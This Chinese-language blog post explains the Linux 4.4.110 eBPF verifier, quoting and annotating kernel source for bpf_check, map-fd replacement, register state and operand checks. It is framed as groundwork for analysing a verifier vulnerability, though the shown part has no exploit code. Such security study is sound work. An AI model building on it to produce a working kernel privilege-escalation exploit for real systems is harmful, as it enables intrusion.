<h1 id="eBPF-verifier机制"><a href="#eBPF-verifier机制" class="headerlink" title="eBPF verifier机制"></a>eBPF verifier机制</h1><p>检查机制核心在于bpf_check函数，一共有两次check，首轮检查的关键函数是check_cfg，对代码进行有向无环图检测，检查代码中是否有循环，以及跳转指令是否跳转到未知位置，第二轮检查由do_check实现。在进行两轮check之前，先执行了replace_map_fd_with_map_ptr函数，首先看一下这个函数，然后再看一下模拟执行的检查。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c#L2214</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_check</span><span class="params">(struct bpf_prog **prog, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> __user *log_ubuf = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">verifier_env</span> *<span class="title">env</span>;</span></span><br><span class="line">	<span class="keyword">int</span> ret = -EINVAL;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//首先检查指令的size，是否小于0或超过BPF_MAXINSNS(4096)</span></span><br><span class="line">	<span class="keyword">if</span> ((*prog)-&gt;len &lt;= <span class="number">0</span> || (*prog)-&gt;len &gt; BPF_MAXINSNS)</span><br><span class="line">		<span class="keyword">return</span> -E2BIG;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 'struct verifier_env' can be global, but since it's not small,</span></span><br><span class="line"><span class="comment">	 * allocate/free it every time bpf_check() is called</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	env = kzalloc(<span class="keyword">sizeof</span>(struct verifier_env), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!env)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	env-&gt;prog = *prog;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* grab the mutex to protect few globals used by verifier */</span></span><br><span class="line">	mutex_lock(&amp;bpf_verifier_lock);</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//获取与log有关的参数，在attr结构体中保存了指令类型，指令大小以及log相关参数</span></span><br><span class="line">	<span class="keyword">if</span> (attr-&gt;log_level || attr-&gt;log_buf || attr-&gt;log_size) &#123;</span><br><span class="line">		<span class="comment">/* user requested verbose verifier output</span></span><br><span class="line"><span class="comment">		 * and supplied buffer to store the verification trace</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		log_level = attr-&gt;log_level;</span><br><span class="line">		log_ubuf = (<span class="keyword">char</span> __user *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) attr-&gt;log_buf;</span><br><span class="line">		log_size = attr-&gt;log_size;</span><br><span class="line">		log_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		ret = -EINVAL;</span><br><span class="line">		<span class="comment">/* log_* values have to be sane */</span></span><br><span class="line">		<span class="keyword">if</span> (log_size &lt; <span class="number">128</span> || log_size &gt; UINT_MAX &gt;&gt; <span class="number">8</span> ||</span><br><span class="line">		    log_level == <span class="number">0</span> || log_ubuf == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> free_env;</span><br><span class="line"></span><br><span class="line">		ret = -ENOMEM;</span><br><span class="line">		log_buf = vmalloc(log_size);</span><br><span class="line">		<span class="keyword">if</span> (!log_buf)</span><br><span class="line">			<span class="keyword">goto</span> free_env;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		log_level = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	</span><br><span class="line">	ret = replace_map_fd_with_map_ptr(env); <span class="comment">//here</span></span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">	env-&gt;explored_states = kcalloc(env-&gt;prog-&gt;len,</span><br><span class="line">				       <span class="keyword">sizeof</span>(struct verifier_state_list *),</span><br><span class="line">				       GFP_USER);</span><br><span class="line">	ret = -ENOMEM;</span><br><span class="line">	<span class="keyword">if</span> (!env-&gt;explored_states)</span><br><span class="line">		<span class="keyword">goto</span> skip_full_check;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">//首轮检查，检查是否有循环存在，以及跳转到未知地址</span></span><br><span class="line">	ret = check_cfg(env);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">	env-&gt;allow_ptr_leaks = capable(CAP_SYS_ADMIN);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//二轮检查，模拟执行的方式，非常细致</span></span><br><span class="line">	ret = do_check(env);</span><br><span class="line"></span><br><span class="line">skip_full_check:</span><br><span class="line">	<span class="keyword">while</span> (pop_stack(env, <span class="literal">NULL</span>) &gt;= <span class="number">0</span>);</span><br><span class="line">	free_states(env);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">		<span class="comment">/* program is valid, convert *(u32*)(ctx + off) accesses */</span></span><br><span class="line">		ret = convert_ctx_accesses(env);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (log_level &amp;&amp; log_len &gt;= log_size - <span class="number">1</span>) &#123;</span><br><span class="line">		BUG_ON(log_len &gt;= log_size);</span><br><span class="line">		<span class="comment">/* verifier log exceeded user supplied buffer */</span></span><br><span class="line">		ret = -ENOSPC;</span><br><span class="line">		<span class="comment">/* fall through to return what was recorded */</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* copy verifier log back to user space including trailing zero */</span></span><br><span class="line">	<span class="keyword">if</span> (log_level &amp;&amp; copy_to_user(log_ubuf, log_buf, log_len + <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">		ret = -EFAULT;</span><br><span class="line">		<span class="keyword">goto</span> free_log_buf;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret == <span class="number">0</span> &amp;&amp; env-&gt;used_map_cnt) &#123;</span><br><span class="line">		<span class="comment">/* if program passed verifier, update used_maps in bpf_prog_info */</span></span><br><span class="line">		env-&gt;prog-&gt;aux-&gt;used_maps = kmalloc_array(env-&gt;used_map_cnt,</span><br><span class="line">							  <span class="keyword">sizeof</span>(env-&gt;used_maps[<span class="number">0</span>]),</span><br><span class="line">							  GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps) &#123;</span><br><span class="line">			ret = -ENOMEM;</span><br><span class="line">			<span class="keyword">goto</span> free_log_buf;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">memcpy</span>(env-&gt;prog-&gt;aux-&gt;used_maps, env-&gt;used_maps,</span><br><span class="line">		       <span class="keyword">sizeof</span>(env-&gt;used_maps[<span class="number">0</span>]) * env-&gt;used_map_cnt);</span><br><span class="line">		env-&gt;prog-&gt;aux-&gt;used_map_cnt = env-&gt;used_map_cnt;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* program is valid. Convert pseudo bpf_ld_imm64 into generic</span></span><br><span class="line"><span class="comment">		 * bpf_ld_imm64 instructions</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		convert_pseudo_ld_imm64(env);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">free_log_buf:</span><br><span class="line">	<span class="keyword">if</span> (log_level)</span><br><span class="line">		vfree(log_buf);</span><br><span class="line">free_env:</span><br><span class="line">	<span class="keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps)</span><br><span class="line">		<span class="comment">/* if we didn't copy map pointers into bpf_prog_info, release</span></span><br><span class="line"><span class="comment">		 * them now. Otherwise free_bpf_prog_info() will release them.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		release_maps(env);</span><br><span class="line">	*prog = env-&gt;prog;</span><br><span class="line">	kfree(env);</span><br><span class="line">	mutex_unlock(&amp;bpf_verifier_lock);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="replace-map-fd-with-map-ptr"><a href="#replace-map-fd-with-map-ptr" class="headerlink" title="replace_map_fd_with_map_ptr"></a>replace_map_fd_with_map_ptr</h2><p>当指令类型为BPF_LD | BPF_IMM | BPF_DW且源寄存器值为1且下一条指令为全0时，该函数会对这条指令以及它的下一条指令进行imm替换，首先根据指令的imm获取bpf_map的fd，根据fd获取bpf_map的地址，然后将该指令的imm替换为map的地址的低32位，高32位赋值给下一条指令的imm。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c#L1990</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">replace_map_fd_with_map_ptr</span><span class="params">(struct verifier_env *env)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> *<span class="title">insn</span> = <span class="title">env</span>-&gt;<span class="title">prog</span>-&gt;<span class="title">insnsi</span>;</span></span><br><span class="line">	<span class="keyword">int</span> insn_cnt = env-&gt;prog-&gt;len;</span><br><span class="line">	<span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对eBPF指令进行遍历</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn_cnt; i++, insn++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_LDX &amp;&amp;</span><br><span class="line">		    (BPF_MODE(insn-&gt;code) != BPF_MEM || insn-&gt;imm != <span class="number">0</span>)) &#123;</span><br><span class="line">			verbose(<span class="string">"BPF_LDX uses reserved fields\n"</span>);</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_STX &amp;&amp;</span><br><span class="line">		    ((BPF_MODE(insn-&gt;code) != BPF_MEM &amp;&amp;</span><br><span class="line">		      BPF_MODE(insn-&gt;code) != BPF_XADD) || insn-&gt;imm != <span class="number">0</span>)) &#123;</span><br><span class="line">			verbose(<span class="string">"BPF_STX uses reserved fields\n"</span>);</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//指令类型为BPF_LD | BPF_IMM | BPF_DW</span></span><br><span class="line">		<span class="keyword">if</span> (insn[<span class="number">0</span>].code == (BPF_LD | BPF_IMM | BPF_DW)) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line">            <span class="comment">//它的下一条指令必须为"\x00\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">			<span class="keyword">if</span> (i == insn_cnt - <span class="number">1</span> || insn[<span class="number">1</span>].code != <span class="number">0</span> ||</span><br><span class="line">			    insn[<span class="number">1</span>].dst_reg != <span class="number">0</span> || insn[<span class="number">1</span>].src_reg != <span class="number">0</span> ||</span><br><span class="line">			    insn[<span class="number">1</span>].off != <span class="number">0</span>) &#123;</span><br><span class="line">				verbose(<span class="string">"invalid bpf_ld_imm64 insn\n"</span>);</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (insn-&gt;src_reg == <span class="number">0</span>)</span><br><span class="line">				<span class="comment">/* valid generic load 64-bit imm */</span></span><br><span class="line">				<span class="keyword">goto</span> next_insn;</span><br><span class="line">            </span><br><span class="line">			<span class="comment">//insn-&gt;src_reg必须等于BPF_PSEUDO_MAP_FD,BPF_PSEUDO_MAP_FD值为1</span></span><br><span class="line">			<span class="keyword">if</span> (insn-&gt;src_reg != BPF_PSEUDO_MAP_FD) &#123;</span><br><span class="line">				verbose(<span class="string">"unrecognized bpf_ld_imm64 insn\n"</span>);</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			f = fdget(insn-&gt;imm); <span class="comment">//立即数为fd</span></span><br><span class="line">			<span class="built_in">map</span> = __bpf_map_get(f); <span class="comment">//根据fd获取结构体bpf_map地址</span></span><br><span class="line">			<span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>)) &#123;</span><br><span class="line">				verbose(<span class="string">"fd %d is not pointing to valid bpf_map\n"</span>,</span><br><span class="line">					insn-&gt;imm);</span><br><span class="line">				<span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* store map pointer inside BPF_LD_IMM64 instruction */</span></span><br><span class="line">			insn[<span class="number">0</span>].imm = (u32) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">map</span>; <span class="comment">//第一条指令的立即数中存储map地址的低32位</span></span><br><span class="line">			insn[<span class="number">1</span>].imm = ((u64) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">map</span>) &gt;&gt; <span class="number">32</span>; <span class="comment">//下一条指令的立即数中存储map地址的高32位</span></span><br><span class="line"></span><br><span class="line">			<span class="comment">/* check whether we recorded this map already */</span></span><br><span class="line">			<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; env-&gt;used_map_cnt; j++)</span><br><span class="line">				<span class="keyword">if</span> (env-&gt;used_maps[j] == <span class="built_in">map</span>) &#123;</span><br><span class="line">					fdput(f);</span><br><span class="line">					<span class="keyword">goto</span> next_insn;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (env-&gt;used_map_cnt &gt;= MAX_USED_MAPS) &#123;</span><br><span class="line">				fdput(f);</span><br><span class="line">				<span class="keyword">return</span> -E2BIG;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* hold the map. If the program is rejected by verifier,</span></span><br><span class="line"><span class="comment">			 * the map will be released by release_maps() or it</span></span><br><span class="line"><span class="comment">			 * will be used by the valid program until it's unloaded</span></span><br><span class="line"><span class="comment">			 * and all maps are released in free_bpf_prog_info()</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="built_in">map</span> = bpf_map_inc(<span class="built_in">map</span>, <span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>)) &#123;</span><br><span class="line">				fdput(f);</span><br><span class="line">				<span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			env-&gt;used_maps[env-&gt;used_map_cnt++] = <span class="built_in">map</span>;</span><br><span class="line"></span><br><span class="line">			fdput(f);</span><br><span class="line">next_insn:</span><br><span class="line">			insn++;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* now all pseudo BPF_LD_IMM64 instructions load valid</span></span><br><span class="line"><span class="comment">	 * 'struct bpf_map *' into a register instead of user map_fd.</span></span><br><span class="line"><span class="comment">	 * These pointers will be used later by verifier to validate map access.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>关于检查机制，这里主要看一下与漏洞相关的do_check的检查逻辑。</p>
<h2 id="do-check"><a href="#do-check" class="headerlink" title="do_check"></a>do_check</h2><h3 id="寄存器初始化"><a href="#寄存器初始化" class="headerlink" title="寄存器初始化"></a>寄存器初始化</h3><p>首先初始化寄存器的状态，寄存器状态由结构体reg_state定义，它由一个枚举和联合类型组成，buf_reg_type定义了寄存器中存储的值的类型，包括初始化、指针、常量等。imm只有在操作数类型是立即数时才有用，此时寄存器类型为CONST_IMM或PTR_TO_STACK。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c#L129</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> &#123;</span></span><br><span class="line">	<span class="keyword">enum</span> bpf_reg_type type;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="comment">/* valid when type == CONST_IMM | PTR_TO_STACK */</span></span><br><span class="line">		<span class="keyword">int</span> imm;  <span class="comment">//注意类型是int</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span></span><br><span class="line"><span class="comment">		 *   PTR_TO_MAP_VALUE_OR_NULL</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> bpf_reg_type &#123;</span><br><span class="line">	NOT_INIT = <span class="number">0</span>,		 <span class="comment">/* nothing was written into register */</span></span><br><span class="line">	UNKNOWN_VALUE,		 <span class="comment">/* reg doesn't contain a valid pointer */</span></span><br><span class="line">	PTR_TO_CTX,		 <span class="comment">/* reg points to bpf_context */</span></span><br><span class="line">	CONST_PTR_TO_MAP,	 <span class="comment">/* reg points to struct bpf_map */</span></span><br><span class="line">	PTR_TO_MAP_VALUE,	 <span class="comment">/* reg points to map element value */</span></span><br><span class="line">	PTR_TO_MAP_VALUE_OR_NULL,<span class="comment">/* points to map elem value or NULL */</span></span><br><span class="line">	FRAME_PTR,		 <span class="comment">/* reg == frame_pointer */</span></span><br><span class="line">	PTR_TO_STACK,		 <span class="comment">/* reg == frame_pointer + imm */</span></span><br><span class="line">	CONST_IMM,		 <span class="comment">/* constant integer value */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>init_reg_state函数初始化寄存器的状态，将所有寄存器的类型初始化为NOT_INIT，R10的type初始化为栈指针，R1类型初始化为指向buf_context的指针。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c#L474</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">init_reg_state</span><span class="params">(struct reg_state *regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_BPF_REG; i++) &#123;</span><br><span class="line">		regs[i].type = NOT_INIT;</span><br><span class="line">		regs[i].imm = <span class="number">0</span>;</span><br><span class="line">		regs[i].map_ptr = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* frame pointer */</span></span><br><span class="line">	regs[BPF_REG_FP].type = FRAME_PTR;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 1st arg to a function */</span></span><br><span class="line">	regs[BPF_REG_1].type = PTR_TO_CTX;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>指令都存储在insns数组中，根据下标insn_idx的数值来获取每一条指令，检查的核心在for定义的无限循环中，insn_processed记录for循环执行的次数，最多执行32768次。首先获取指令的类型class，前面提到有8大类型，根据不同的指令类型有不同的处理方式。由于代码比较长，这里只关注与本漏洞相关的指令类型中的检查逻辑。首先看这几个check中用到的函数。</p>
<h3 id="检查中的常用函数"><a href="#检查中的常用函数" class="headerlink" title="检查中的常用函数"></a>检查中的常用函数</h3><h4 id="check-reg-arg"><a href="#check-reg-arg" class="headerlink" title="check_reg_arg"></a>check_reg_arg</h4><p>首先是当寄存器作为操作数时，对寄存器进行检查的check_reg_arg函数，根据寄存器在指令中所处的位置（源操作数/目的操作数）分别对其type进行检查，当为读指令时，检查源操作数是否为可读；指令为写指令时，检查目的操作数是否可写。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c#L505</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check_reg_arg</span><span class="params">(struct reg_state *regs, u32 regno,</span></span></span><br><span class="line"><span class="function"><span class="params">			 <span class="keyword">enum</span> reg_arg_type t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//检查是否超过R10的未定义寄存器</span></span><br><span class="line">	<span class="keyword">if</span> (regno &gt;= MAX_BPF_REG) &#123;</span><br><span class="line">		verbose(<span class="string">"R%d is invalid\n"</span>, regno);</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//寄存器作为源操作数，检查寄存器是否为可读状态（类型为指针或具体数值），但不能是未初始化</span></span><br><span class="line">	<span class="keyword">if</span> (t == SRC_OP) &#123;</span><br><span class="line">		<span class="comment">/* check whether register used as source operand can be read */</span></span><br><span class="line">		<span class="keyword">if</span> (regs[regno].type == NOT_INIT) &#123;</span><br><span class="line">			verbose(<span class="string">"R%d !read_ok\n"</span>, regno);</span><br><span class="line">			<span class="keyword">return</span> -EACCES;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; </span><br><span class="line">	</span><br><span class="line">	<span class="comment">//寄存器作为目的操作数，检查寄存器是否为可写状态（栈指针只读），并修改寄存器类型</span></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* check whether register used as dest operand can be written to */</span></span><br><span class="line">		<span class="keyword">if</span> (regno == BPF_REG_FP) &#123;</span><br><span class="line">			verbose(<span class="string">"frame pointer is read only\n"</span>);</span><br><span class="line">			<span class="keyword">return</span> -EACCES;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (t == DST_OP)</span><br><span class="line">			mark_reg_unknown_value(regs, regno); <span class="comment">//将寄存器类型修改为UNKNOWN_VALUE，map_ptr指针置空</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
